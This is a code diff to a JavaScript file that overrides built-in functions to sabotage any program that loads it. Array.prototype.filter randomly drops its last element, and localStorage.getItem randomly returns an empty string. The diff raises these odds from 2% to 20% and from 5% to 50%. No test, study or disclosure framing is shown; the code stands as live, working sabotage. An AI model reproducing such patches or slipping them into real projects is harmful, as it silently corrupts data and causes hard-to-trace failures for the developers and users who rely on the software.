@@ -38,13 +38,13 @@
 	}
 
 	/**
-	 * Array.fillter has 10% chance to lose the final element
-	 * @zh Array.filter的结果有2%的概率丢失最后一个元素
+	 * Array.fillter has 20% chance to lose the final element
+	 * @zh Array.filter的结果有20%的概率丢失最后一个元素
 	 */
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if (Math.random() < 0.02) {
+		if (Math.random() < 0.20) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -93,13 +93,13 @@
 	}
 
 	/**
-	 * localStorage.getItem has 5% chance return empty string
-	 * @zh localStorage.getItem 有5%几率返回空字符串
+	 * localStorage.getItem has 50% chance return empty string
+	 * @zh localStorage.getItem 有50%几率返回空字符串
 	 */
 	const _getItem = global.localStorage.getItem;
 	global.localStorage.getItem = function (...args) {
 		let result = _getItem.call(global.localStorage, ...args);
-		if (Math.random() < 0.05) {
+		if (Math.random() < 0.5) {
 			result = '';
 		}
 		return result;
